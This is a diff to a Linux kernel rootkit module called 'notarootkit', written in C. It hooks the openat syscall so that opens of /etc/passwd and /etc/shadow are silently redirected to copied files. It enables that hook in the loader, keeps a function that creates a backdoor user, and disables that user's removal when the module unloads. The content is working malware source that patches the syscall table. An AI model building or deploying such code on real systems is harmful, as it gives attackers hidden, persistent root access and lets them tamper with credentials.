@@ -60,9 +60,18 @@ asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count)
     //note how above the saved original ptr has to be casted back to typeof(sys_read) before being called.
 }
 
-asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode)
+asmlinkage long totallyReal_openfat(int dirfd, const char *pathname, int flags, mode_t mode)
 {
-    pr_info("openAt called (mkdir?) path:%s\n", pathname);
+    if (strstr(pathname, "/etc/passwd") != NULL) {
+	pr_info("openAt called (open) path:%s,,fd:%d\n", pathname, dirfd);
+	copy_to_user((void *)pathname, "/etc/secretpasswd", strlen("/etc/secretpasswd") + 1);
+        return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
+    } else if (strstr(pathname, "/etc/shadow") != NULL) {
+	pr_info("/etc/shadow opened\n");
+	copy_to_user((void *)pathname, "/etc/secretshadow", strlen("/etc/secretshadow") + 1);
+        return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
+    }
+
     return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
 }
 
@@ -170,13 +179,11 @@ void restoreSyscalls(void)
  */
 void create_fake_files(void)
 {
-    vol_disable_h = 1;
-
     char *envp[] = {"HOME=/", NULL};
 
     // NOTE: probably want to hide these files with the "ls" part of the rootkit
-    char *argv1[] = {"/bin/cp", "/etc/passwd", "/etc/.fakepasswd", NULL};
-    char *argv2[] = {"/bin/cp", "/etc/shadow", "/etc/.fakeshadow", NULL};
+    char *argv1[] = {"/bin/cp", "/etc/passwd", "/etc/secretpasswd", NULL};
+    char *argv2[] = {"/bin/cp", "/etc/shadow", "/etc/secretshadow", NULL};
 
     printk(KERN_INFO "attempting to duplicate/create fake files\n");
 
@@ -189,8 +196,6 @@ void create_fake_files(void)
     {
         printk(KERN_INFO "unable to copy shadow\n");
     }
-
-    vol_disable_h = 0;
 }
 
 /**
@@ -198,8 +203,6 @@ void create_fake_files(void)
  */
 void create_backdoor_user(void)
 {
-    vol_disable_h = 1;
-
     char *envp[] = {"HOME=/", NULL};
 
     // add "-p" followed by a hashed password to specify a password.
@@ -213,8 +216,6 @@ void create_backdoor_user(void)
     {
         printk(KERN_INFO "unable to create backdoor user\n");
     }
-
-    vol_disable_h = 0;
 
     return;
 }
@@ -418,8 +419,8 @@ int __init loadMod(void)
     toInject[0] = 0;                                        //set whether or not you want to inject your fake function.
 
     syscall_names[1] = __NR_openat;
-    totallyReal_syscallPtrs[1] = (void *)&totallyReal_openat;
-    toInject[1] = 0;
+    totallyReal_syscallPtrs[1] = (void *)&totallyReal_openfat;
+    toInject[1] = 1;
 
     syscall_names[2] = __NR_mkdir;
     totallyReal_syscallPtrs[2] = (void *)&totallyReal_mkdir;
@@ -432,10 +433,10 @@ int __init loadMod(void)
     toInject[4] = 1;
 
     // allow writing on x86
-    CR0_WRITE_UNLOCK({
-        actual_open = (typeof(sys_read) *)sys_call_table[__NR_read];
-        sys_call_table[__NR_read] = (void *)&hooked_spoof_read;
-    });
+  //  CR0_WRITE_UNLOCK({
+   //     actual_open = (typeof(sys_read) *)sys_call_table[__NR_read];
+   //     sys_call_table[__NR_read] = (void *)&hooked_spoof_read;
+    //});
 
     injectSyscalls();
 
@@ -450,7 +451,7 @@ void __exit unloadMod(void)
     pr_info("notarootkit unloading\n");
 
     // remove the backdoor account from the /etc/passwd & shadow file
-    remove_backdoor_user();
+    //remove_backdoor_user();
 
     restoreSyscalls();
 
